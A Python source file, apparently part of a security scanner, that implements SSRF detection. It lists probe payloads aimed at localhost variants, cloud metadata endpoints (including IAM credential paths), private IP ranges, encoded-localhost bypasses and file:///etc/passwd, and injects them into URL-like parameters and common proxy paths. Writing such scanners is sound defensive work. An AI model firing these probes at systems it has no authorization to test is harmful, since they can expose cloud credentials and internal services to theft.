"""Server-Side Request Forgery (SSRF) scanner.

Strategy:
1. Identify parameters that accept URLs or hostnames
2. Inject internal/private IP addresses and cloud metadata URLs
3. Detect if the server fetches the injected URL (response differs from baseline)
4. Check for redirect-based SSRF bypasses
"""

import re
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from src.utils.http_client import HttpClient, RequestResult


@dataclass
class SSRFFinding:
    """A confirmed SSRF vulnerability."""
    url: str
    method: str
    injection_point: str
    payload: str
    severity: str
    evidence: dict
    description: str


# Parameters commonly used for URL/file fetching
URL_PARAM_NAMES = [
    "url", "uri", "link", "href", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "callback", "callback_url", "next", "next_url", "target", "path",
    "file", "filename", "load", "fetch", "page", "feed", "host",
    "site", "domain", "proxy", "image", "img", "icon", "logo",
    "preview", "webhook", "endpoint",
]

# SSRF probe payloads — test internal access
SSRF_PROBES = [
    # Localhost variants
    ("http://127.0.0.1/", "localhost_ipv4"),
    ("http://localhost/", "localhost_name"),
    ("http://[::1]/", "localhost_ipv6"),
    ("http://0.0.0.0/", "localhost_zero"),
    # Cloud metadata endpoints
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata"),
    # Internal network probes
    ("http://10.0.0.1/", "internal_10"),
    ("http://172.16.0.1/", "internal_172"),
    ("http://192.168.1.1/", "internal_192"),
    # DNS rebinding / bypass attempts
    ("http://0x7f000001/", "hex_localhost"),
    ("http://2130706433/", "decimal_localhost"),
    # File protocol
    ("file:///etc/passwd", "file_protocol"),
]

# Patterns in responses that indicate successful SSRF
SSRF_SUCCESS_INDICATORS = [
    # AWS metadata
    re.compile(r"ami-[0-9a-f]+"),
    re.compile(r"instance-id"),
    re.compile(r"iam/security-credentials"),
    # GCP metadata
    re.compile(r"project/project-id"),
    re.compile(r"computeMetadata"),
    # Azure metadata
    re.compile(r"\"vmId\""),
    re.compile(r"\"subscriptionId\""),
    # /etc/passwd
    re.compile(r"root:.*:0:0:"),
    # Internal pages
    re.compile(r"(?i)dashboard|admin|internal|intranet"),
    # Generic server responses
    re.compile(r"(?i)apache|nginx|iis.*server"),
]


class SSRFScanner:
    """Scans for Server-Side Request Forgery vulnerabilities."""

    def __init__(self, http_client: HttpClient):
        self._http = http_client

    async def scan_endpoint(
        self,
        url: str,
        headers: dict | None = None,
    ) -> list[SSRFFinding]:
        """Scan an endpoint for SSRF vulnerabilities."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return findings

        # Identify URL-like parameters
        url_params = self._find_url_params(params)

        for param_name in url_params:
            param_findings = await self._test_ssrf(url, param_name, params, parsed, headers or {})
            findings.extend(param_findings)

        return findings

    async def probe_common_ssrf_endpoints(
        self,
        base_url: str,
        headers: dict | None = None,
    ) -> list[SSRFFinding]:
        """Probe endpoints commonly vulnerable to SSRF."""
        findings = []

        # Common SSRF-prone paths
        ssrf_paths = [
            "/api/fetch?url=",
            "/api/proxy?url=",
            "/api/preview?url=",
            "/api/webhook?url=",
            "/api/import?url=",
            "/api/export?url=",
            "/proxy?url=",
            "/redirect?url=",
            "/load?url=",
        ]

        for path in ssrf_paths:
            for payload, probe_type in SSRF_PROBES[:4]:  # Only test localhost variants
                test_url = f"{base_url.rstrip('/')}{path}{payload}"
                result = await self._http.get(test_url, headers=headers or {})

                if result.error or result.status_code in (404, 405):
                    break  # Path doesn't exist, skip remaining probes

                if self._indicates_ssrf(result, probe_type):
                    findings.append(SSRFFinding(
                        url=f"{base_url.rstrip('/')}{path}",
                        method="GET",
                        injection_point=f"path:{path}",
                        payload=payload,
                        severity="critical" if "metadata" in probe_type else "high",
                        evidence={
                            "probe_type": probe_type,
                            "status_code": result.status_code,
                            "response_length": len(result.body),
                            "ssrf_indicators_found": True,
                        },
                        description=(
                            f"SSRF via {path} at {base_url}. "
                            f"The server fetched internal resource '{payload}' and returned "
                            f"{result.status_code} with {len(result.body)} bytes. "
                            f"This allows an attacker to access internal services and cloud metadata."
                        ),
                    ))
                    break  # One finding per path

        return findings

    async def _test_ssrf(
        self,
        url: str,
        param_name: str,
        params: dict,
        parsed,
        headers: dict,
    ) -> list[SSRFFinding]:
        """Test a specific parameter for SSRF."""
        findings = []

        # Get baseline response with original value
        baseline = await self._http.get(url, headers=headers)

        for payload, probe_type in SSRF_PROBES:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params), parsed.fragment,
            ))

            result = await self._http.get(test_url, headers=headers)

            if result.error:
                continue

            if self._indicates_ssrf(result, probe_type):
                severity = "critical" if "metadata" in probe_type or "file" in probe_type else "high"
                findings.append(SSRFFinding(
                    url=url,
                    method="GET",
                    injection_point=f"query_param:{param_name}",
                    payload=payload,
                    severity=severity,
                    evidence={
                        "param": param_name,
                        "probe_type": probe_type,
                        "status_code": result.status_code,
                        "baseline_status": baseline.status_code,
                        "response_length": len(result.body),
                        "baseline_length": len(baseline.body),
                    },
                    description=(
                        f"SSRF via '{param_name}' parameter at {url}. "
                        f"Injecting '{payload}' caused the server to return different content "
                        f"({result.status_code}, {len(result.body)} bytes vs baseline "
                        f"{baseline.status_code}, {len(baseline.body)} bytes). "
                        f"Probe type: {probe_type}."
                    ),
                ))
                break  # One finding per param per probe type

        return findings

    def _find_url_params(self, params: dict) -> list[str]:
        """Identify parameters that likely accept URLs."""
        url_params = []
        for param_name, values in params.items():
            name_lower = param_name.lower()
            # Check if param name suggests URL input
            if any(url_name == name_lower for url_name in URL_PARAM_NAMES):
                url_params.append(param_name)
                continue
            # Check if value looks like a URL
            value = values[0] if isinstance(values, list) else values
            if isinstance(value, str) and (value.startswith("http") or value.startswith("//")):
                url_params.append(param_name)
        return url_params

    def _indicates_ssrf(self, result: RequestResult, probe_type: str) -> bool:
        """Check if the response indicates successful SSRF."""
        if result.status_code in (404, 403, 400, 405, 0):
            return False

        # Check for SSRF success indicators in the response
        for pattern in SSRF_SUCCESS_INDICATORS:
            if pattern.search(result.body):
                return True

        # For metadata probes: any 200 with substantial content is suspicious
        if "metadata" in probe_type and result.status_code == 200 and len(result.body) > 20:
            return True

        # For file protocol: check for file contents
        if probe_type == "file_protocol" and "root:" in result.body:
            return True

        return False
